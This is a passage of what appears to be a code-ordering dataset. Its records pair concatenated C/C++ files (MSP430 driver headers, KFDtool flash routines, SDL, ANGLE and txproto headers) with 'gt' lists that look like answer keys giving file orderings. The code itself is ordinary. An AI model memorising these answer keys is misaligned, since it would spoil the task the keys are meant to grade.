operand);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void MPY32_setOperandOne24Bit(uint8_t multiplicationType,\n\n                                     uint32_t operand);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void MPY32_setOperandOne32Bit(uint8_t multiplicationType,\n\n                                     uint32_t operand);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void MPY32_setOperandTwo8Bit(uint8_t operand);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void MPY32_setOperandTwo16Bit(uint16_t operand);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void MPY32_setOperandTwo24Bit(uint32_t operand);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void MPY32_setOperandTwo32Bit(uint32_t operand);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint64_t MPY32_getResult(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint16_t MPY32_getSumExtension(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint16_t MPY32_getCarryBitValue(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void MPY32_clearCarryBitValue(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void MPY32_preloadResult(uint64_t result);\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifdef __cplusplus\n\n}\n\n#endif\n\n\n\n#endif\n\n#endif\n\n\n'KFDtool/fw/KFDtool/InfoData.c'\n:\n\n\n\n\n\n#include \"driverlib.h\"\n\n#include \"InfoData.h\"\n\n\n\n#define INFOB_START (0x1900)\n\n#define INFOB_LENGTH (128)\n\n\n\n#define INFOC_START (0x1880)\n\n#define INFOC_LENGTH (128)\n\n\n\nuint16_t idWriteModelIdHwRev(uint8_t hwId, uint8_t hwRevMaj, uint8_t hwRevMin)\n\n{\n\n    uint8_t data[5];\n\n\n\n    data[0] = 0x10;\n\n    data[1] = hwId;\n\n    data[2] = hwRevMaj;\n\n    data[3] = hwRevMin;\n\n    data[4] = 0x11;\n\n\n\n    uint16_t status;\n\n\n\n    do\n\n    {\n\n        FlashCtl_eraseSegment((uint8_t *)INFOB_START);\n\n        status = FlashCtl_performEraseCheck((uint8_t *)INFOB_START, INFOB_LENGTH);\n\n    } while (status == STATUS_FAIL);\n\n\n\n    FlashCtl_write8(data, (uint8_t *)INFOB_START, sizeof(data));\n\n\n\n    return 1;\n\n}\n\n\n\nuint16_t idWriteSerNum(uint8_t ser0, uint8_t ser1, uint8_t ser2, uint8_t ser3, uint8_t ser4, uint8_t ser5)\n\n{\n\n    uint8_t data[8];\n\n\n\n    data[0] = 0x20;\n\n    data[1] = ser0;\n\n    data[2] = ser1;\n\n    data[3] = ser2;\n\n    data[4] = ser3;\n\n    data[5] = ser4;\n\n    data[6] = ser5;\n\n    data[7] = 0x22;\n\n\n\n    uint16_t status;\n\n\n\n    do\n\n    {\n\n        FlashCtl_eraseSegment((uint8_t *)INFOC_START);\n\n        status = FlashCtl_performEraseCheck((uint8_t *)INFOC_START, INFOC_LENGTH);\n\n    } while (status == STATUS_FAIL);\n\n\n\n    FlashCtl_write8(data, (uint8_t *)INFOC_START, sizeof(data));\n\n\n\n    return 1;\n\n}\n\n\n\nuint16_t idReadModelId(uint8_t *hwId)\n\n{\n\n    uint16_t *flashPtr;\n\n\n\n    flashPtr = (uint16_t *)INFOB_START;\n\n\n\n    uint8_t header;\n\n    uint8_t footer;\n\n\n\n    header = *flashPtr;\n\n    *hwId = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    *flashPtr++;\n\n    footer = *flashPtr;\n\n\n\n    if (header == 0x10 && footer == 0x11)\n\n    {\n\n        return 1;\n\n    }\n\n    else\n\n    {\n\n        return 0;\n\n    }\n\n}\n\n\n\nuint16_t idReadHwRev(uint8_t *hwRevMaj, uint8_t *hwRevMin)\n\n{\n\n    uint16_t *flashPtr;\n\n\n\n    flashPtr = (uint16_t *)INFOB_START;\n\n\n\n    uint8_t header;\n\n    uint8_t footer;\n\n\n\n    header = *flashPtr;\n\n    *flashPtr++;\n\n    *hwRevMaj = *flashPtr;\n\n    *hwRevMin = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    footer = *flashPtr;\n\n\n\n    if (header == 0x10 && footer == 0x11)\n\n    {\n\n        return 1;\n\n    }\n\n    else\n\n    {\n\n        return 0;\n\n    }\n\n}\n\n\n\nuint16_t idReadSerNum(uint8_t *ser0, uint8_t *ser1, uint8_t *ser2, uint8_t *ser3, uint8_t *ser4, uint8_t *ser5)\n\n{\n\n    uint16_t *flashPtr;\n\n\n\n    flashPtr = (uint16_t *)INFOC_START;\n\n\n\n    uint8_t header;\n\n    uint8_t footer;\n\n\n\n    header = *flashPtr;\n\n    *ser0 = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    *ser1 = *flashPtr;\n\n    *ser2 = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    *ser3 = *flashPtr;\n\n    *ser4 = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    footer = (*flashPtr >> 8);\n\n    *ser5 = *flashPtr;\n\n\n\n    if (header == 0x20 && footer == 0x22)\n\n    {\n\n        return 1;\n\n    }\n\n    else\n\n    {\n\n        return 0;\n\n    }\n\n}\n\n\n'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'\n:\n\n#include \"inc/hw_memmap.h\"\n\n\n\n#include \"sysctl.h\"\n\n#include \"dma.h\"\n\n#include \"eusci_b_i2c.h\"\n\n#include \"rtc_b.h\"\n\n#include \"crc.h\"\n\n#include \"usci_a_uart.h\"\n\n#include \"flashctl.h\"\n\n#include \"ram.h\"\n\n#include \"dac12_a.h\"\n\n#include \"pmap.h\"\n\n#include \"mpy32.h\"\n\n#include \"rtc_a.h\"\n\n#include \"ucs.h\"\n\n#include \"aes.h\"\n\n#include \"tec.h\"\n\n#include \"usci_a_spi.h\"\n\n#include \"sfr.h\"\n\n#include \"wdt_a.h\"\n\n#include \"timer_a.h\"\n\n#include \"oa.h\"\n\n#include \"pmm.h\"\n\n#include \"lcd_b.h\"\n\n#include \"rtc_c.h\"\n\n#include \"adc10_a.h\"\n\n#include \"eusci_a_uart.h\"\n\n#include \"ctsd16.h\"\n\n#include \"usci_b_spi.h\"\n\n#include \"comp_b.h\"\n\n#include \"gpio.h\"\n\n#include \"tlv.h\"\n\n#include \"ldopwr.h\"\n\n#include \"adc12_a.h\"\n\n#include \"ref.h\"\n\n#include \"eusci_a_spi.h\"\n\n#include \"timer_b.h\"\n\n#include \"battbak.h\"\n\n#include \"usci_b_i2c.h\"\n\n#include \"eusci_b_spi.h\"\n\n#include \"timer_d.h\"\n\n#include \"lcd_c.h\"\n\n#include \"sd24_b.h\"\n\n",
        "gt": [
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/mpy32.h'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'",
            "'KFDtool/fw/KFDtool/InfoData.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_atomic.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_images_h\n#define _SDL_test_images_h\n\n#include \"SDL.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\ntypedef struct SDLTest_SurfaceImage_s {\n  int width;\n  int height;\n  unsigned int bytes_per_pixel;\n  const char *pixel_data;\n} SDLTest_SurfaceImage_t;\n\n\nSDL_Surface *SDLTest_ImageBlit();\nSDL_Surface *SDLTest_ImageBlitColor();\nSDL_Surface *SDLTest_ImageBlitAlpha();\nSDL_Surface *SDLTest_ImageBlitBlendAdd();\nSDL_Surface *SDLTest_ImageBlitBlend();\nSDL_Surface *SDLTest_ImageBlitBlendMod();\nSDL_Surface *SDLTest_ImageBlitBlendNone();\nSDL_Surface *SDLTest_ImageBlitBlendAll();\nSDL_Surface *SDLTest_ImageFace();\nSDL_Surface *SDLTest_ImagePrimitives();\nSDL_Surface *SDLTest_ImagePrimitivesBlend();\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_atomic.h'\n:\n\n\n\n#ifndef _SDL_atomic_h_\n#define _SDL_atomic_h_\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_platform.h\"\n\n#include \"begin_code.h\"\n\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\ntypedef int SDL_SpinLock;\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_AtomicTryLock(SDL_SpinLock *lock);\n\n\nextern DECLSPEC void SDLCALL SDL_AtomicLock(SDL_SpinLock *lock);\n\n\nextern DECLSPEC void SDLCALL SDL_AtomicUnlock(SDL_SpinLock *lock);\n\n\n#if defined(_MSC_VER) && (_MSC_VER > 1200)\nvoid _ReadWriteBarrier(void);\n#pragma intrinsic(_ReadWriteBarrier)\n#define SDL_CompilerBarrier()   _ReadWriteBarrier()\n#elif (defined(__GNUC__) && !defined(__EMSCRIPTEN__)) || (defined(__SUNPRO_C) && (__SUNPRO_C >= 0x5120))\n\n#define SDL_CompilerBarrier()   __asm__ __volatile__ (\"\" : : : \"memory\")\n#else\n#define SDL_CompilerBarrier()   \\\n{ SDL_SpinLock _tmp = 0; SDL_AtomicLock(&_tmp); SDL_AtomicUnlock(&_tmp); }\n#endif\n\n\n#if defined(__GNUC__) && (defined(__powerpc__) || defined(__ppc__))\n#define SDL_MemoryBarrierRelease()   __asm__ __volatile__ (\"lwsync\" : : : \"memory\")\n#define SDL_MemoryBarrierAcquire()   __asm__ __volatile__ (\"lwsync\" : : : \"memory\")\n#elif defined(__GNUC__) && defined(__arm__)\n#if defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7EM__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)\n#define SDL_MemoryBarrierRelease()   __asm__ __volatile__ (\"dmb ish\" : : : \"memory\")\n#define SDL_MemoryBarrierAcquire()   __asm__ __volatile__ (\"dmb ish\" : : : \"memory\")\n#elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6T2__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__)\n#ifdef __thumb__\n\nextern DECLSPEC void SDLCALL SDL_MemoryBarrierRelease();\nextern DECLSPEC void SDLCALL SDL_MemoryBarrierAcquire();\n#else\n#define SDL_MemoryBarrierRelease()   __asm__ __volatile__ (\"mcr p15, 0, %0, c7, c10, 5\" : : \"r\"(0) : \"memory\")\n#define SDL_MemoryBarrierAcquire()   __asm__ __volatile__ (\"mcr p15, 0, %0, c7, c10, 5\" : : \"r\"(0) : \"memory\")\n#endif\n#else\n#define SDL_MemoryBarrierRelease()   __asm__ __volatile__ (\"\" : : : \"memory\")\n#define SDL_MemoryBarrierAcquire()   __asm__ __volatile__ (\"\" : : : \"memory\")\n#endif\n#else\n#if (defined(__SUNPRO_C) && (__SUNPRO_C >= 0x5120))\n\n#include <mbarrier.h>\n#define SDL_MemoryBarrierRelease()  __machine_rel_barrier()\n#define SDL_MemoryBarrierAcquire()  __machine_acq_barrier()\n#else\n\n#define SDL_MemoryBarrierRelease()  SDL_CompilerBarrier()\n#define SDL_MemoryBarrierAcquire()  SDL_CompilerBarrier()\n#endif\n#endif\n\n\ntypedef struct { int value; } SDL_atomic_t;\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_AtomicCAS(SDL_atomic_t *a, int oldval, int newval);\n\n\nextern DECLSPEC int SDLCALL SDL_AtomicSet(SDL_atomic_t *a, int v);\n\n\nextern DECLSPEC int SDLCALL SDL_AtomicGet(SDL_atomic_t *a);\n\n\nextern DECLSPEC int SDLCALL SDL_AtomicAdd(SDL_atomic_t *a, int v);\n\n\n#ifndef SDL_AtomicIncRef\n#define SDL_AtomicIncRef(a)    SDL_AtomicAdd(a, 1)\n#endif\n\n\n#ifndef SDL_AtomicDecRef\n#define SDL_AtomicDecRef(a)    (SDL_AtomicAdd(a, -1) == 1)\n#endif\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_AtomicCASPtr(void **a, void *oldval, void *newval);\n\n\nextern DECLSPEC void* SDLCALL SDL_AtomicSetPtr(void **a, void* v);\n\n\nextern DECLSPEC void* SDLCALL SDL_AtomicGetPtr(void **a);\n\n\n#ifdef __cplusplus\n}\n#endif\n\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_atomic.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/Compiler.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/EmulatePrecision.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/CallDAG.h'"
        ],
        "content": "'freshplayerplugin/3rdparty/angle/src/compiler/translator/Compiler.h'\n:\n\n\n\n\n\n#ifndef COMPILER_TRANSLATOR_COMPILER_H_\n#define COMPILER_TRANSLATOR_COMPILER_H_\n\n\n\n\n\n\n\n\n#include \"compiler/translator/BuiltInFunctionEmulator.h\"\n#include \"compiler/translator/CallDAG.h\"\n#include \"compiler/translator/ExtensionBehavior.h\"\n#include \"compiler/translator/HashNames.h\"\n#include \"compiler/translator/InfoSink.h\"\n#include \"compiler/translator/Pragma.h\"\n#include \"compiler/translator/SymbolTable.h\"\n\nclass TCompiler;\n\n\n\n\nclass TShHandleBase {\npublic:\n    TShHandleBase();\n    virtual ~TShHandleBase();\n    virtual TCompiler* getAsCompiler() { return 0; }\n\nprotected:\n\n\n    TPoolAllocator allocator;\n};\n\n\n\n\n\nclass TCompiler : public TShHandleBase\n{\n  public:\n    TCompiler(sh::GLenum type, ShShaderSpec spec, ShShaderOutput output);\n    virtual ~TCompiler();\n    virtual TCompiler* getAsCompiler() { return this; }\n\n    bool Init(const ShBuiltInResources& resources);\n\n\n\n\n    TIntermNode *compileTreeForTesting(const char* const shaderStrings[],\n        size_t numStrings, int compileOptions);\n\n    bool compile(const char* const shaderStrings[],\n        size_t numStrings, int compileOptions);\n\n\n    int getShaderVersion() const { return shaderVersion; }\n    TInfoSink& getInfoSink() { return infoSink; }\n\n\n    void clearResults();\n\n    ShHashFunction64 getHashFunction() const { return hashFunction; }\n    NameMap& getNameMap() { return nameMap; }\n    TSymbolTable& getSymbolTable() { return symbolTable; }\n    ShShaderSpec getShaderSpec() const { return shaderSpec; }\n    ShShaderOutput getOutputType() const { return outputType; }\n    const std::string &getBuiltInResourcesString() const { return builtInResourcesString; }\n\n\n    const ShBuiltInResources& getResources() const;\n\n  protected:\n    sh::GLenum getShaderType() const { return shaderType; }\n\n    bool InitBuiltInSymbolTable(const ShBuiltInResources& resources);\n\n    void setResourceString();\n\n    bool validateOutputs(TIntermNode* root);\n\n    virtual void initBuiltInFunctionEmulator(BuiltInFunctionEmulator *emu, int compileOptions) {};\n\n    virtual void translate(TIntermNode *root, int compileOptions) = 0;\n\n    const TExtensionBehavior& getExtensionBehavior() const;\n    const char *getSourcePath() const;\n    const TPragma& getPragma() const { return mPragma; }\n    void writePragma();\n\n    const BuiltInFunctionEmulator& getBuiltInFunctionEmulator() const;\n\n  private:\n\n    bool initCallDag(TIntermNode *root);\n\n    bool tagUsedFunctions();\n    void internalTagUsedFunction(size_t index);\n\n\n    class UnusedPredicate;\n\n    TIntermNode *compileTreeImpl(const char* const shaderStrings[],\n        size_t numStrings, int compileOptions);\n\n    sh::GLenum shaderType;\n    ShShaderSpec shaderSpec;\n    ShShaderOutput outputType;\n\n    struct FunctionMetadata\n    {\n        FunctionMetadata()\n            : used(false)\n        {\n        }\n        bool used;\n    };\n\n    CallDAG mCallDag;\n    std::vector<FunctionMetadata> functionMetadata;\n\n    int maxUniformVectors;\n    int maxExpressionComplexity;\n    int maxCallStackDepth;\n\n    ShBuiltInResources compileResources;\n    std::string builtInResourcesString;\n\n\n\n    TSymbolTable symbolTable;\n\n    TExtensionBehavior extensionBehavior;\n    bool fragmentPrecisionHigh;\n\n    BuiltInFunctionEmulator builtInFunctionEmulator;\n\n\n    int shaderVersion;\n    TInfoSink infoSink;\n    const char *mSourcePath;\n\n\n    ShHashFunction64 hashFunction;\n    NameMap nameMap;\n\n    TPragma mPragma;\n};\n\n\n\n\n\n\n\n\n\n\nTCompiler* ConstructCompiler(\n    sh::GLenum type, ShShaderSpec spec, ShShaderOutput output);\nvoid DeleteCompiler(TCompiler*);\n\n#endif\n\n'freshplayerplugin/3rdparty/angle/src/compiler/translator/EmulatePrecision.h'\n:\n\n\n\n\n\n#ifndef COMPILER_TRANSLATOR_EMULATE_PRECISION_H_\n#define COMPILER_TRANSLATOR_EMULATE_PRECISION_H_\n\n#include \"common/angleutils.h\"\n#include \"compiler/translator/Compiler.h\"\n#include \"compiler/translator/InfoSink.h\"\n#include \"compiler/translator/IntermNode.h\"\n#include \"GLSLANG/ShaderLang.h\"\n\n\n\n\n\n\nclass EmulatePrecision : public TLValueTrackingTraverser\n{\n  public:\n    EmulatePrecision(const TSymbolTable &symbolTable, int shaderVersion);\n\n    virtual void visitSymbol(TIntermSymbol *node);\n    virtual bool visitBinary(Visit visit, TIntermBinary *node);\n    virtual bool visitUnary(Visit visit, TIntermUnary *node);\n    virtual bool visitAggregate(Visit visit, TIntermAggregate *node);\n\n    void writeEmulationHelpers(TInfoSinkBase& sink, ShShaderOutput outputLanguage);\n\n  private:\n    struct TypePair\n    {\n        TypePair(const char *l, const char *r)\n            : lType(l), rType(r) { }\n\n        const char *lType;\n        const char *rType;\n    };\n\n    struct TypePairComparator\n    {\n        bool operator() (const TypePair& l, const TypePair& r) const\n        {\n            if (l.lType == r.lType)\n                return l.rType < r.rType;\n            return l.lType < r.lType;\n        }\n    };\n\n    typedef std::set<TypePair, TypePairComparator> EmulationSet;\n    EmulationSet mEmulateCompoundAdd;\n    EmulationSet mEmulateCompoundSub;\n    EmulationSet mEmulateCompoundMul;\n    EmulationSet mEmulateCompoundDiv;\n\n    bool mDeclaringVariables;\n};\n\n#endif\n\n'freshplayerplugin/3rdparty/angle/src/compiler/translator/CallDAG.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef COMPILER_TRANSLATOR_CALLDAG_H_\n#define COMPILER_TRANSLATOR_CALLDAG_H_\n\n#include <map>\n\n#include \"compiler/translator/IntermNode.h\"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nclass CallDAG : angle::NonCopyable\n{\n  public:\n    CallDAG();\n    ~CallDAG();\n\n    struct Record\n    {\n        std::string name;\n        TIntermAggregate *node;\n        std::vector<int> callees;\n    };\n\n    enum InitResult\n    {\n        INITDAG_SUCCESS,\n        INITDAG_RECURSION,\n        INITDAG_UNDEFINED,\n    };\n\n\n\n    InitResult init(TIntermNode *root, TInfoSinkBase *info);\n\n\n    size_t findIndex(const TIntermAggregate *function) const;\n\n    const Record &getRecordFromIndex(size_t index) const;\n    const Record &getRecord(const TIntermAggregate *function) const;\n    size_t size() const;\n    void clear();\n\n    const static size_t InvalidIndex;\n  private:\n    std::vector<Record> mRecords;\n    std::map<int, int> mFunctionIdToIndex;\n\n    class CallDAGCreator;\n};\n\n#endif\n",
        "gt": [
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/CallDAG.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/Compiler.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/EmulatePrecision.h'"
        ]
    },
    {
        "files": [
            "'txproto/src/include/libtxproto/encode.h'",
            "'txproto/src/control.c'",
            "'txproto/src/include/libtxproto/mux.h'",
            "'txproto/src/include/libtxproto/fifo_frame.h'"
        ],
        "content": "'txproto/src/include/libtxproto/encode.h'\n:\n\n#pragma once\n\n#include <stdatomic.h>\n#include <libavcodec/avcodec.h>\n#include <libswresample/swresample.h>\n\n#include <libtxproto/fifo_packet.h>\n#include <libtxproto/fifo_frame.h>\n#include <libtxproto/utils.h>\n#include \"log.h\"\n\n\ntypedef struct EncodingContext {\n    SPClass *class;\n\n    const char *name;\n    pthread_mutex_t lock;\n\n    int64_t epoch;\n    atomic_int soft_flush;\n\n\n    AVDictionary *codec_config;\n    AVBufferRef *src_frames;\n    AVBufferRef *dst_packets;\n    const AVCodec *codec;\n    int need_global_header;\n    AVBufferRef *mode_negotiate_event;\n\n\n    SPBufferList *events;\n\n\n    atomic_int initialized;\n    atomic_int running;\n\n\n    int width, height;\n    enum AVPixelFormat pix_fmt;\n    SPRotation rotation;\n\n\n    int sample_rate;\n    enum AVSampleFormat sample_fmt;\n    AVChannelLayout ch_layout;\n    bool ch_layout_present;\n\n\n    pthread_t encoding_thread;\n    AVCodecContext *avctx;\n\n\n    AVBufferRef *enc_frames_ref;\n\n\n    SwrContext *swr;\n    int swr_configured_rate;\n    AVChannelLayout swr_configured_layout;\n    int swr_configured_format;\n\n\n    AVFrame *reconfigure_frame;\n    int waiting_eof;\n    int attach_sidedata;\n\n    int err;\n} EncodingContext;\n\nAVBufferRef *sp_encoder_alloc(void);\nint sp_encoder_init(AVBufferRef *ctx_ref);\nint sp_encoder_ctrl(AVBufferRef *ctx_ref, SPEventType ctrl, void *arg);\n\n'txproto/src/control.c'\n:\n\n#include \"../config.h\"\n\n#ifdef HAVE_INTERFACE\n#include \"interface_common.h\"\n#endif\n\n#include \"iosys_common.h\"\n\n#include <libtxproto/control.h>\n#include <libtxproto/commit.h>\n#include <libtxproto/encode.h>\n#include <libtxproto/decode.h>\n#include <libtxproto/mux.h>\n#include <libtxproto/filter.h>\n\nctrl_fn sp_get_ctrl_fn(void *ctx)\n{\n    enum SPType type = sp_class_get_type(ctx);\n    switch (type) {\n    case SP_TYPE_ENCODER:\n        return sp_encoder_ctrl;\n    case SP_TYPE_MUXER:\n        return sp_muxer_ctrl;\n    case SP_TYPE_DECODER:\n        return sp_decoder_ctrl;\n    case SP_TYPE_DEMUXER:\n        return sp_demuxer_ctrl;\n    case SP_TYPE_FILTER:\n        return sp_filter_ctrl;\n#ifdef HAVE_INTERFACE\n    case SP_TYPE_INTERFACE:\n        return sp_interface_ctrl;\n#endif\n    case SP_TYPE_AUDIO_SOURCE:\n    case SP_TYPE_AUDIO_SINK:\n    case SP_TYPE_AUDIO_BIDIR:\n    case SP_TYPE_VIDEO_SOURCE:\n    case SP_TYPE_VIDEO_SINK:\n    case SP_TYPE_VIDEO_BIDIR:\n    case SP_TYPE_SUB_SOURCE:\n    case SP_TYPE_SUB_SINK:\n    case SP_TYPE_SUB_BIDIR:\n        return ((IOSysEntry *)ctx)->ctrl;\n    default:\n        break;\n    }\n    return NULL;\n}\n\nint sp_generic_ctrl(TXMainContext *ctx,\n                    AVBufferRef *ref,\n                    SPEventType flags,\n                    void *arg)\n{\n    int err;\n\n    ctrl_fn fn = sp_get_ctrl_fn(ref->data);\n    if (!fn) {\n        sp_log(ctx, SP_LOG_ERROR, \"Unsupported CTRL type: %s!\",\n               sp_class_type_string(ref->data));\n        return AVERROR(EINVAL);\n    }\n\n    if (!(flags & SP_EVENT_CTRL_MASK)) {\n        sp_log(ctx, SP_LOG_ERROR, \"Missing ctrl: command: %s!\",\n               av_err2str(AVERROR(EINVAL)));\n        return AVERROR(EINVAL);\n    } else if (flags & SP_EVENT_ON_MASK) {\n        sp_log(ctx, SP_LOG_ERROR, \"Event specified but given to a ctrl, use %s.schedule: %s!\",\n               sp_class_get_name(ref->data), av_err2str(AVERROR(EINVAL)));\n        return AVERROR(EINVAL);\n    } else if ((flags & SP_EVENT_CTRL_OPTS) && (!arg)) {\n        sp_log(ctx, SP_LOG_ERROR, \"No options specified for ctrl:opts: %s!\",\n               av_err2str(AVERROR(EINVAL)));\n        return AVERROR(EINVAL);\n    }\n\n    if (flags & SP_EVENT_CTRL_START)\n        err = fn(ref, flags, &ctx->epoch_value);\n    else\n        err = fn(ref, flags, arg);\n    if (err < 0) {\n        sp_log(ctx, SP_LOG_ERROR, \"Unable to process CTRL: %s\",\n               av_err2str(err));\n        return AVERROR(EINVAL);\n    }\n\n    if (!(flags & SP_EVENT_FLAG_IMMEDIATE))\n        sp_add_commit_fn_to_list(ctx, fn, ref);\n\n    return 0;\n}\n\n'txproto/src/include/libtxproto/mux.h'\n:\n\n#pragma once\n\n#include <stdatomic.h>\n#include <libavformat/avformat.h>\n\n#include \"encode.h\"\n#include \"log.h\"\n\ntypedef struct MuxingContext {\n    SPClass *class;\n\n    const char *name;\n    pthread_mutex_t lock;\n\n    AVFormatContext *avf;\n    pthread_t muxing_thread;\n\n\n    SPBufferList *events;\n\n    int64_t epoch;\n    const char *out_url;\n    const char *out_format;\n    int low_latency;\n    int dump_info;\n    char *dump_sdp_file;\n\n    AVBufferRef *src_packets;\n\n\n    struct MuxEncoderMap *enc_map;\n    int 